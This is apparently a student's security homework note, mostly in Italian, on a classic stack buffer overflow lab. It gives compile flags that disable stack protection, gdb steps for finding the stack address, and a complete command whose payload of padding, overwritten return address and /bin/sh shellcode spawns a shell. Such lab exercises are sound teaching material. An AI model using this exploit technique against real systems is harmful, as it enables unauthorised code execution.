## FILE PER Homework di sicurezza informatica


Remember to check with checksec the attributes of main.o and disable ASLR!

```
gcc -o main.o main.c -fno-stack-protector -z execstack
```

Guardo com'è strutturata la stack e becco l'indirizzo iniziale di stack

disas oflow
(set breakpoint after strcpy)
run $(python3 -c "print(b'A'*30)")
x/200xb $esp

L'indirizzo di inizio stack 0xbfffee2c (verrà poi scritto little-endian e aumentato leggermente per puntare alla nop sled)

il payload finale sarà costruito come:

	padding + (return_addr + 4) + shellcode
		inizia ad eseguire da dopo il return address


```
run $(python -c "print('\x41'*76+'\x30\xee\xff\xbf'+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')")
```